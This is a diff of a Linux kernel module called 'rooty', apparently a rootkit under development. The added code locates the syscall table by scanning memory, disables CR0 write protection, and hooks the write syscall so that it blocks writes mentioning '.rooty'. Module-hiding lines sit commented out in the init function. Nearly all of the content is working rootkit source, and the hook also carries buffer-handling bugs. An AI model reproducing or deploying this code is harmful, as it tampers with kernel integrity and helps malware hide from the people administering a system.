@@ -1,8 +1,18 @@
 #include <linux/module.h>
 #include <linux/init.h>
 #include <linux/kernel.h>
+#include <linux/kobject.h>
+#include <linux/unistd.h>
+#include <linux/syscalls.h>
+#include <linux/string.h>
+#include <linux/slab.h>
 
-#define __NR_close (__NR_SYSCALL_BASE+ 6)
+MODULE_LICENSE("GPL");
+
+int rooty_init(void);
+void rooty_exit(void);
+module_init(rooty_init);
+module_exit(rooty_exit);
 
 #if defined(__i386__)
 #define START_CHECK 0xc0000000
@@ -14,44 +24,63 @@ typedef unsigned int psize;
 typedef unsigned long psize;
 #endif
 
-MODULE_LICENSE("GPL");
-int rooty_init(void);
-void rooty_exit(void);
-module_init(rooty_init);
-module_exit(rooty_exit);
-psize **find(void);
+asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
 
 psize *sys_call_table;
-
 psize **find(void) {
-  psize **sctable;
-  psize i = START_CHECK;
-  while (i < END_CHECK) {
-    sctable = (psize **) i;
-    if (sctable[__NR_CLOSE] == (psize *) sys_close) {
-      return &sctable[0];
-    }
-    i += sizeof(void *);
+ psize **sctable;
+ psize i = START_CHECK;
+ while (i < END_CHECK) {
+  sctable = (psize **) i;
+  if (sctable[__NR_close] == (psize *) sys_close) {
+   return &sctable[0];
   }
-  return NULL;
+  i += sizeof(void *);
+ }
+ return NULL;
+}
+
+asmlinkage ssize_t rooty_write(int fd, const char __user *buff, ssize_t count) {
+ int r;
+ char *proc_protect = ".rooty";
+ char *kbuff = (char *) kmalloc(256,GFP_KERNEL);
+ copy_from_user(kbuff,buff,255);
+ if (strstr(kbuff,proc_protect)) {
+  kfree(kbuff);
+  return EEXIST;
+ }
+ r = (*o_write)(fd,buff,count);
+ kfree(kbuff);
+ return r;
 }
 
 int rooty_init(void) {
-  ///Undelete when actually trying to hide rooty---
-  /* list_del_init(&__this_module.list); */
-  /* kobject_del(&THIS_MODULE->mkobj.kobj); */
-  ///----------
-  printk("rooty: module loaded\n");
+ /* Do kernel module hiding*/
+ /* list_del_init(&__this_module.list); */
+ /* kobject_del(&THIS_MODULE->mkobj.kobj); */
 
-  if(sys_call_table = (psize *) find()) {
-    printk("rooty: sys_call_table found at %p\n", sys_call_table);
-  } else {
-    printk("rooty: sys_call_table not found.\n");
-  }
+ /* Find the sys_call_table address in kernel memory */
+ if ((sys_call_table = (psize *) find())) {
+  printk("rooty: sys_call_table found at %p\n", sys_call_table);
+ } else {
+  printk("rooty: sys_call_table not found, aborting\n");
+ }
 
-  return 0;
+ /* disable write protect on page in cr0 */
+ write_cr0(read_cr0() & (~ 0x10000));
+
+ /* hijack functions */
+ o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write);
+
+ /* return sys_call_table to WP */
+ write_cr0(read_cr0() | 0x10000);
+
+ return 0;
 }
 
 void rooty_exit(void) {
-  printk("rooty: module removed\n");
+ write_cr0(read_cr0() & (~ 0x10000));
+ xchg(&sys_call_table[__NR_write],o_write);
+ write_cr0(read_cr0() | 0x10000);
+ printk("rooty: Module unloaded\n");
 }
